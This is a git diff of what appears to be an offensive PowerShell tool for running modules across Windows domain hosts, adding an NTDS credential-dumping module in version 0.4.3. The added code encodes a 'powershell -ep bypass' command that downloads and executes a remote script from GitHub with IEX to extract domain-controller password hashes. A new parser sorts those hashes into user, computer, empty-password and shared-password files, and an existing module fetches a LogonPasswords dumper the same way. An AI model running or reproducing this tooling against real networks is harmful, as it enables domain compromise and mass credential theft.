@@ -102,7 +102,7 @@ Write-Output $Banner
 Write-Host "Github  : "  -NoNewline
 Write-Host "https://github.com/The-Viper-One"
 Write-Host "Version : " -NoNewline
-Write-Host "0.4.2"
+Write-Host "0.4.3"
 Write-Host
 
 # If no targets have been provided
@@ -269,6 +269,7 @@ $InvokeRubeusLoaded = Get-Command -Name "Invoke-Rubeus" -ErrorAction "SilentlyCo
 
 $PandemoniumURL = "https://raw.githubusercontent.com/The-Viper-One/PME-Scripts/main/Invoke-Pandemonium.ps1"
 $KirbyURL = "https://raw.githubusercontent.com/The-Viper-One/PME-Scripts/main/Kirby.ps1"
+$NTDSURL = "https://raw.githubusercontent.com/The-Viper-One/PME-Scripts/main/Invoke-NTDS.ps1"
 
 # Check if $LocalFileServer is not NULL
 if (![string]::IsNullOrEmpty($LocalFileServer)) {
@@ -321,11 +322,12 @@ $Sessions = Join-Path "$PME" "Sessions"
 $UserFiles = Join-Path "$PME" "User Files"
 $Spraying = Join-Path $PME "Spraying"
 $VNC = Join-Path $PME "VNC"
+$NTDS = Join-Path $PME "NTDS"
 
   $directories = @(
     $PME, $SAM, $LogonPasswords, $MSSQL, $SMB, $Tickets, $ekeys, 
     $LSA, $KerbDump, $MimiTickets, $ConsoleHistory, $Sessions, 
-    $UserFiles, $Spraying, $VNC
+    $UserFiles, $Spraying, $VNC, $NTDS
 )
 
 foreach ($directory in $directories) {
@@ -861,6 +863,7 @@ $moduleMessages = @{
     "LogonPasswords"   = "LogonPasswords output will be written to $LogonPasswords"
     "ConsoleHistory"   = "Console History output will be written to $ConsoleHistory"
     "Files"            = "File output will be written to $UserFiles"
+    "NTDS"             = "NTDS output will be written to $NTDS"
 }
 
 if ($moduleMessages.ContainsKey($Module)) {
@@ -1047,6 +1050,13 @@ $Command = "powershell.exe -ep bypass -enc $base64command"
 # LogonPasswords
 elseif ($Module -eq "LogonPasswords"){
 $b64 = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 ; try {$Mongoose}catch{} ;IEX(New-Object System.Net.WebClient).DownloadString(""$PandemoniumURL"");Invoke-Pandemonium -Command ""dump"""
+$base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b64))
+$Command = "powershell.exe -ep bypass -enc $base64command"
+}
+
+# NTDS
+elseif ($Module -eq "NTDS"){
+$b64 = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 ; try {$Mongoose}catch{} ; IEX(New-Object System.Net.WebClient).DownloadString(""$NTDSURL"");Invoke-NTDS"
 $base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b64))
 $Command = "powershell.exe -ep bypass -enc $base64command"
 }
@@ -1455,6 +1465,7 @@ do {
             $runspace.Completed = $true
             $result = $runspace.Runspace.EndInvoke($runspace.Handle)
             $hasDisplayedResult = $false
+            $result = $result.trim()
 
             # [other conditions for $result]
             if ($result -eq "Access Denied") {
@@ -1471,7 +1482,14 @@ do {
                 if ($successOnly) { continue }
                 Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "TIMED OUT" -NameLength $NameLength -OSLength $OSLength
                 continue
+            }
+            
+            elseif ($result -eq "NotDomainController" -and $Module -eq "NTDS") {
+                if ($successOnly) { continue }
+                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "NON-DOMAIN CONTROLLER" -NameLength $NameLength -OSLength $OSLength
+                continue
             } 
+                         
             elseif ($result -eq "Successful Connection PME") {
                 Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Green" -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
             } 
@@ -1496,6 +1514,7 @@ do {
                         "LSA"            { "$LSA\$($runspace.ComputerName)-LSA.txt" }
                         "ConsoleHistory" { "$ConsoleHistory\$($runspace.ComputerName)-ConsoleHistory.txt" }
                         "Files"          { "$UserFiles\$($runspace.ComputerName)-UserFiles.txt" }
+                        "NTDS"           { "$NTDS\$($runspace.ComputerName)-NTDS.txt"}
                         default          { $null }
                     }
 
@@ -1793,6 +1812,8 @@ do {
             $runspace.Completed = $true
             $result = $runspace.Runspace.EndInvoke($runspace.Handle)
             $hasDisplayedResult = $false
+            $result = $result.trim()
+
 
             # [other conditions for $result]
             if ($result -eq "Access Denied") {
@@ -1805,11 +1826,19 @@ do {
                 Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "ERROR" -NameLength $NameLength -OSLength $OSLength
                 continue
             } 
+            
             elseif ($result -eq "Timed Out") {
                 if ($successOnly) { continue }
                 Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "TIMED OUT" -NameLength $NameLength -OSLength $OSLength
                 continue
+            }
+            
+            elseif ($result -eq "NotDomainController" -and $Module -eq "NTDS") {
+                if ($successOnly) { continue }
+                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "NON-DOMAIN CONTROLLER" -NameLength $NameLength -OSLength $OSLength
+                continue
             } 
+             
             elseif ($result -eq "Successful Connection PME") {
                 Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Green" -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
             } 
@@ -1821,7 +1850,8 @@ do {
                 if ($result -eq "No Results") {
                     if ($successOnly) { continue }
                     Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "NO RESULTS" -NameLength $NameLength -OSLength $OSLength
-                } 
+                }
+                 
                 else {
                     Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Green" -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
 
@@ -1834,6 +1864,7 @@ do {
                         "LSA"            { "$LSA\$($runspace.ComputerName)-LSA.txt" }
                         "ConsoleHistory" { "$ConsoleHistory\$($runspace.ComputerName)-ConsoleHistory.txt" }
                         "Files"          { "$UserFiles\$($runspace.ComputerName)-UserFiles.txt" }
+                        "NTDS"           { "$NTDS\$($runspace.ComputerName)-NTDS.txt"}
                         default          { $null }
                     }
 
@@ -1991,6 +2022,7 @@ do {
             $runspace.Completed = $true
             $result = $runspace.Runspace.EndInvoke($runspace.Handle)
             $hasDisplayedResult = $false
+            $result = $result.trim()
 
             # [other conditions for $result]
             if ($result -eq "Access Denied") {
@@ -2007,7 +2039,14 @@ do {
                 if ($successOnly) { continue }
                 Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "TIMED OUT" -NameLength $NameLength -OSLength $OSLength
                 continue
-            } 
+            }
+            
+            elseif ($result -eq "NotDomainController" -and $Module -eq "NTDS") {
+                if ($successOnly) { continue }
+                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "NON-DOMAIN CONTROLLER" -NameLength $NameLength -OSLength $OSLength
+                continue
+            }
+             
             elseif ($result -eq "Successful Connection PME") {
                 Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Green" -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
             } 
@@ -2032,6 +2071,7 @@ do {
                         "LSA"            { "$LSA\$($runspace.ComputerName)-LSA.txt" }
                         "ConsoleHistory" { "$ConsoleHistory\$($runspace.ComputerName)-ConsoleHistory.txt" }
                         "Files"          { "$UserFiles\$($runspace.ComputerName)-UserFiles.txt" }
+                        "NTDS"           { "$NTDS\$($runspace.ComputerName)-NTDS.txt"}
                         default          { $null }
                     }
 
@@ -3523,6 +3563,7 @@ do {
             $runspace.Completed = $true
             $result = $runspace.Runspace.EndInvoke($runspace.Handle)
             $hasDisplayedResult = $false
+            $result = $result.Trim()
 
             # [other conditions for $result]
             if ($result -eq "Access Denied") {
@@ -5154,6 +5195,99 @@ function Parse-KerbDump {
     Write-Host "Each ticket has been stored in $KerbDump"
 }
 
+################################################################################################################
+############################################## Function: Parse-NTDS ############################################
+################################################################################################################
+
+Function Parse-NTDS {
+    param (
+        [string]$DirectoryPath
+    )
+
+    if ([string]::IsNullOrEmpty($DirectoryPath)) {
+        Write-Host "Directory path is not specified or is empty." -ForegroundColor Red
+        return
+    }
+
+    if (-not (Test-Path -Path $DirectoryPath)) {
+        Write-Host "Directory at path '$DirectoryPath' does not exist." -ForegroundColor Red
+        return
+    }
+
+    $currentTime = Get-Date -Format "yyyyMMddHHmmss"
+    Get-ChildItem -Path $DirectoryPath -Filter "*-NTDS.txt" -File | ForEach-Object {
+        $NTDSFile = $_.FullName
+        $computerName = [IO.Path]::GetFileNameWithoutExtension($_.Name) -replace "-NTDS", ""
+        $newDirectoryName = "${computerName}-${currentTime}"
+        $newDirectoryPath = Join-Path $DirectoryPath $newDirectoryName
+
+        if (-not (Test-Path -Path $newDirectoryPath)) {
+            New-Item -Path $newDirectoryPath -ItemType "Directory" | Out-Null
+        }
+
+        $userHashes = @()
+        $computerHashes = @()
+        $identicalPasswordGroups = @{}
+        $emptyPasswordUsers = @()
+        $samHashes = @()
+
+        $prevLine = ""
+        Get-Content $NTDSFile | ForEach-Object {
+            $line = $_
+            $parts = $line -split ':'
+            $user = $parts[0]
+            $hash = $parts[3]
+
+            if ($hash -eq '31d6cfe0d16ae931b73c59d7e0c089c0') {
+                $emptyPasswordUsers += $user
+            }
+
+            if ($user -like "*$*") {
+                $computerHashes += $line
+            } else {
+                $userHashes += $line
+
+                if ($hash -ne $null) {
+                    if (-not $identicalPasswordGroups.ContainsKey($hash)) {
+                        $identicalPasswordGroups[$hash] = @()
+                    }
+                    $identicalPasswordGroups[$hash] += $user
+                }
+
+                # Check if the previous line and the current line do not have two "::" in a row
+                if (-not ($line -match ':::' -and $prevLine -match ':::')) {
+                    $samHashes += $line
+                }
+            }
+
+            $prevLine = $line
+        }
+
+        $userHashes | Set-Content -Path (Join-Path $newDirectoryPath "UserHashes.txt")
+        $computerHashes | Set-Content -Path (Join-Path $newDirectoryPath "ComputerHashes.txt")
+        $emptyPasswordUsers | Set-Content -Path (Join-Path $newDirectoryPath "UsersWithEmptyPasswords.txt")
+
+        $groupNumber = 1
+        $groupedUsersContent = foreach ($group in $identicalPasswordGroups.GetEnumerator()) {
+            if ($group.Value.Count -gt 1) {
+                $groupContent = "[Group $groupNumber]`n{0}" -f ($group.Value -join "`n")
+                $groupNumber++
+                $groupContent
+                Write-Output ""
+            }
+        }
+
+        $groupedUsersContent | Set-Content -Path (Join-Path $newDirectoryPath "GroupedUsersWithIdenticalPasswords.txt")
+
+        $newFileName = ".$computerName-NTDS-Full.txt"
+        Move-Item -Path $NTDSFile -Destination (Join-Path $newDirectoryPath $newFileName) -Force
+
+        # Write SAM hashes to SAMHashes.txt
+        $samHashes | Set-Content -Path (Join-Path $newDirectoryPath "SAMHashes.txt")
+    }
+}
+
+
 
 
 
@@ -5186,6 +5320,7 @@ if (!$NoParse){if ($Module -eq "SAM"){Parse-SAM}}
 if (!$NoParse){if ($Module -eq "eKeys"){Parse-eKeys}}
 if (!$NoParse){if ($Module -eq "LogonPasswords"){Parse-LogonPasswords}}
 if (!$NoParse){if ($Module -eq "KerbDump"){Parse-KerbDump}}
+if (!$NoParse){if ($Module -eq "NTDS"){Parse-NTDS -DirectoryPath $NTDS}}
 
 RestoreTicket
 
